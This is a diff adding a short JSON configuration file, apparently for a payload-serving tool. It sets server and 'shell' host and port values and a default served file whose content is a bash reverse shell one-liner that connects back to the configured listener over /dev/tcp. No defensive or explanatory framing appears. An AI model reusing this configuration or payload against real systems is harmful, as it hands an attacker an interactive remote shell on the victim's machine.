@@ -1,0 +1,10 @@
+{
+    "server-host": "127.0.0.1",
+    "server-port": 80,
+    "shell-host": "127.0.0.1",
+    "shell-port": 2020,
+    "static": "",
+    "file": "",
+    "content-type": "text/plain",
+    "default-file-content": "bash -i &> /dev/tcp/${{ env.shell_host }}/${{ env.shell_port }} 0>&1"
+}
